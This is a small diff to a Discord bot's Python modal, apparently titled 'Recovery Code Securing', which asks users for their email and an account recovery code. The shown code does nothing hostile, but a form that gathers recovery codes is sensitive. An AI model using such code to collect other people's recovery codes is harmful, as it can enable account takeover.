@@ -4,7 +4,7 @@ import discord
 from cogs.utils.recoverySecure import recoverySecure
 
 class recoveryModal(ui.Modal):
-    def __init__(self):
+    def __init__(self, type: str):
         super().__init__(title="Recovery Code Securing")
         self.add_item(ui.InputText(label="Email", placeholder="example@gmail.com", required=True))
         self.add_item(ui.InputText(label="Recovery Code", placeholder="XXXXX-XXXXX-XXXXX-XXXXX-XXXXX", required = True))
